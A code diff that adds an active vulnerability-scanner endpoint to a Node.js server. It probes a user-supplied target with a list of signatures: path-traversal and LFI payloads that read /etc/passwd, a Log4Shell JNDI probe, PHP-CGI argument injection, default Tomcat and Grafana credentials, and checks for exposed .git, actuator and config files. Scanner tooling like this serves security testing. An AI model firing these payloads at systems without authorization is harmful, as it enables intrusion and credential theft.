@@ -837,6 +837,223 @@ http.createServer(async (req, res) => {
     return;
   }
 
+  // 3.5. POST /api/scanner/jaeles — Active CVE vulnerability scanner (Jaeles-style)
+  if (path === "/api/scanner/jaeles" && req.method === "POST") {
+    let payload;
+    try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON" }); return; }
+    const { target } = payload;
+    if (!target) { send(res, 400, { error: "Missing target" }); return; }
+    const host = target.replace(/^https?:\/\//, "").split("/")[0];
+    if (await isBlockedTarget(host)) { send(res, 403, { error: "Target not allowed" }); return; }
+
+    const baseUrl = target.startsWith("http") ? target : `https://${target}`;
+    const results = [];
+
+    // Jaeles-style active vulnerability signatures
+    const jaelesSignatures = [
+      // ── CVE Exploits ──────────────────────────────────────────────────────
+      // Apache Path Traversal (CVE-2021-41773 / CVE-2021-42013)
+      { id: "CVE-2021-41773", name: "Apache Path Traversal", severity: "critical",
+        path: "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        match: /root:.*:0:0/i, category: "cve" },
+      { id: "CVE-2021-42013", name: "Apache Path Traversal v2", severity: "critical",
+        path: "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
+        match: /root:.*:0:0/i, category: "cve" },
+      // Spring4Shell (CVE-2022-22965)
+      { id: "CVE-2022-22965", name: "Spring4Shell RCE", severity: "critical",
+        path: "/?class.module.classLoader.DefaultAssertionStatus=nonsense",
+        match: /400|Internal Server Error/i, checkStatus: [400, 500], category: "cve" },
+      // Log4Shell probe (CVE-2021-44228)
+      { id: "CVE-2021-44228", name: "Log4Shell (probe)", severity: "critical",
+        path: "/", customHeaders: { "X-Api-Version": "${jndi:ldap://127.0.0.1/test}" },
+        match: /.*/, checkStatus: [200, 302, 400, 500], detectByHeader: true, category: "cve" },
+      // Nginx alias traversal
+      { id: "nginx-alias-traversal", name: "Nginx Alias Traversal", severity: "high",
+        path: "/static../etc/passwd",
+        match: /root:.*:0:0/i, category: "cve" },
+      // PHP-CGI argument injection (CVE-2012-1823)
+      { id: "CVE-2012-1823", name: "PHP-CGI Argument Injection", severity: "critical",
+        path: "/?-s",
+        match: /<code>|<span|php.*source/i, category: "cve" },
+
+      // ── Default Credentials ──────────────────────────────────────────────
+      { id: "tomcat-default", name: "Tomcat Manager Default Creds", severity: "critical",
+        path: "/manager/html",
+        customHeaders: { "Authorization": "Basic dG9tY2F0OnRvbWNhdA==" }, // tomcat:tomcat
+        match: /Tomcat Web Application Manager|Manager App/i, category: "creds" },
+      { id: "tomcat-default2", name: "Tomcat Manager (admin:admin)", severity: "critical",
+        path: "/manager/html",
+        customHeaders: { "Authorization": "Basic YWRtaW46YWRtaW4=" }, // admin:admin
+        match: /Tomcat Web Application Manager|Manager App/i, category: "creds" },
+      { id: "jenkins-noauth", name: "Jenkins No Auth", severity: "critical",
+        path: "/script",
+        match: /Groovy script|Jenkins\.instance/i, category: "creds" },
+      { id: "grafana-default", name: "Grafana Default Creds", severity: "critical",
+        path: "/api/org",
+        customHeaders: { "Authorization": "Basic YWRtaW46YWRtaW4=" }, // admin:admin
+        match: /"id":\d+,"name"/i, category: "creds" },
+      { id: "kibana-noauth", name: "Kibana No Auth", severity: "high",
+        path: "/api/status",
+        match: /"status":\{.*"overall"/i, category: "creds" },
+      { id: "elasticsearch-noauth", name: "Elasticsearch No Auth", severity: "critical",
+        path: "/_cat/indices",
+        match: /green|yellow|red.*\d+.*\d+/i, category: "creds" },
+      { id: "mongodb-http", name: "MongoDB HTTP Interface", severity: "critical",
+        path: "/",
+        customPort: 28017,
+        match: /MongoDB|mongod/i, category: "creds" },
+
+      // ── RCE / LFI / SSRF Tests ──────────────────────────────────────────
+      // LFI via common params
+      { id: "lfi-file-param", name: "LFI via ?file= param", severity: "critical",
+        path: "/?file=../../../etc/passwd",
+        match: /root:.*:0:0/i, category: "lfi" },
+      { id: "lfi-page-param", name: "LFI via ?page= param", severity: "critical",
+        path: "/?page=../../../etc/passwd",
+        match: /root:.*:0:0/i, category: "lfi" },
+      { id: "lfi-path-param", name: "LFI via ?path= param", severity: "critical",
+        path: "/?path=../../../etc/passwd",
+        match: /root:.*:0:0/i, category: "lfi" },
+      { id: "lfi-include-param", name: "LFI via ?include= param", severity: "critical",
+        path: "/?include=../../../etc/passwd",
+        match: /root:.*:0:0/i, category: "lfi" },
+      // Windows LFI
+      { id: "lfi-windows", name: "LFI Windows (win.ini)", severity: "critical",
+        path: "/?file=..\\..\\..\\windows\\win.ini",
+        match: /\[fonts\]|\[extensions\]/i, category: "lfi" },
+
+      // ── Technology-Specific ──────────────────────────────────────────────
+      // WordPress REST API user enum
+      { id: "wp-user-enum", name: "WordPress User Enumeration", severity: "medium",
+        path: "/wp-json/wp/v2/users",
+        match: /"id":\d+,"name":"[^"]+","slug"/i, category: "tech" },
+      // WordPress debug.log
+      { id: "wp-debug-log", name: "WordPress Debug Log Exposed", severity: "high",
+        path: "/wp-content/debug.log",
+        match: /PHP (Fatal|Warning|Notice|Deprecated)/i, category: "tech" },
+      // Drupal user enum
+      { id: "drupal-user-enum", name: "Drupal User Enumeration", severity: "medium",
+        path: "/user/1",
+        match: /member for|access denied/i, checkStatus: [200], category: "tech" },
+      // Joomla config backup
+      { id: "joomla-config", name: "Joomla Config Backup", severity: "critical",
+        path: "/configuration.php.bak",
+        match: /\$db|\$password|\$host/i, category: "tech" },
+      // Git HEAD
+      { id: "git-head", name: "Git HEAD Exposed", severity: "critical",
+        path: "/.git/HEAD",
+        match: /ref: refs\/heads\//i, category: "tech" },
+      // Git packed-refs
+      { id: "git-packed", name: "Git packed-refs Exposed", severity: "critical",
+        path: "/.git/packed-refs",
+        match: /refs\/heads|refs\/tags/i, category: "tech" },
+      // Laravel debug
+      { id: "laravel-debug", name: "Laravel Debug Mode", severity: "high",
+        path: "/_ignition/health-check",
+        match: /"can_execute_commands"/i, category: "tech" },
+      // Symfony profiler
+      { id: "symfony-profiler", name: "Symfony Profiler Exposed", severity: "high",
+        path: "/_profiler/",
+        match: /Symfony Profiler|sf-toolbar/i, category: "tech" },
+      // Django debug
+      { id: "django-debug", name: "Django Debug Info", severity: "high",
+        path: "/admin/",
+        match: /Django administration|DJANGO_SETTINGS_MODULE/i, category: "tech" },
+      // Node.js Express stack trace
+      { id: "express-stacktrace", name: "Express.js Stack Trace Leak", severity: "medium",
+        path: "/%FF",
+        match: /at Layer\.handle|at Function\.handle|URIError/i, category: "tech" },
+
+      // ── HTTP Method Abuse ────────────────────────────────────────────────
+      { id: "trace-enabled", name: "HTTP TRACE Enabled", severity: "medium",
+        path: "/", method: "TRACE",
+        match: /TRACE \/ HTTP/i, category: "method" },
+      { id: "put-enabled", name: "HTTP PUT Enabled", severity: "high",
+        path: "/test-put-method-check",
+        method: "PUT", putBody: "test",
+        match: /.*/, checkStatus: [200, 201, 204], category: "method" },
+
+      // ── Info Disclosure ──────────────────────────────────────────────────
+      { id: "actuator-health", name: "Spring Actuator Health", severity: "high",
+        path: "/actuator/health",
+        match: /"status"\s*:\s*"UP"/i, category: "info" },
+      { id: "actuator-env", name: "Spring Actuator Env", severity: "critical",
+        path: "/actuator/env",
+        match: /"propertySources"|"activeProfiles"/i, category: "info" },
+      { id: "actuator-beans", name: "Spring Actuator Beans", severity: "high",
+        path: "/actuator/beans",
+        match: /"beans"|"scope":"singleton"/i, category: "info" },
+      { id: "haproxy-stats", name: "HAProxy Stats Exposed", severity: "high",
+        path: "/haproxy?stats",
+        match: /HAProxy Statistics|haproxy/i, category: "info" },
+      { id: "metrics-prometheus", name: "Prometheus Metrics Exposed", severity: "medium",
+        path: "/metrics",
+        match: /process_cpu|http_requests_total|go_gc/i, category: "info" },
+      { id: "env-json", name: "Environment Variables Exposed", severity: "critical",
+        path: "/env.json",
+        match: /DATABASE_URL|SECRET_KEY|API_KEY|PASSWORD/i, category: "info" },
+      { id: "config-json", name: "Config.json Exposed", severity: "high",
+        path: "/config.json",
+        match: /"database"|"password"|"secret"|"apiKey"/i, category: "info" },
+    ];
+
+    for (const sig of jaelesSignatures) {
+      try {
+        const testUrl = baseUrl.replace(/\/$/, "") + sig.path;
+        const fetchOpts = { headers: sig.customHeaders || {} };
+        if (sig.method) fetchOpts.method = sig.method;
+        if (sig.putBody) fetchOpts.body = sig.putBody;
+        
+        const r = await extFetch(testUrl, fetchOpts).catch(() => null);
+        if (!r) continue;
+        
+        const body = typeof r.data === "string" ? r.data : JSON.stringify(r.data);
+        let matched = false;
+
+        if (sig.checkStatus) {
+          matched = sig.checkStatus.includes(r.status) && sig.match.test(body);
+        } else {
+          matched = r.status === 200 && sig.match.test(body);
+        }
+
+        if (matched) {
+          results.push({
+            id: sig.id,
+            name: sig.name,
+            severity: sig.severity,
+            category: sig.category,
+            path: sig.path,
+            status: r.status,
+            snippet: body.substring(0, 150).replace(/[<>]/g, ""),
+          });
+        }
+        await new Promise(r => setTimeout(r, 100)); // Rate limiting
+      } catch { /* skip */ }
+    }
+
+    // Categorize results
+    const byCat = {};
+    for (const r of results) {
+      if (!byCat[r.category]) byCat[r.category] = [];
+      byCat[r.category].push(r);
+    }
+
+    send(res, 200, {
+      target,
+      engine: "jaeles",
+      checksRun: jaelesSignatures.length,
+      findings: results,
+      byCategory: byCat,
+      summary: {
+        total: results.length,
+        critical: results.filter(r => r.severity === "critical").length,
+        high: results.filter(r => r.severity === "high").length,
+        medium: results.filter(r => r.severity === "medium").length,
+      },
+    });
+    return;
+  }
+
   // 4. GET /api/scanner/shodan?ip=8.8.8.8&key=xxx
   if (path === "/api/scanner/shodan") {
     const ip = parsed.searchParams.get("ip") || parsed.searchParams.get("query");
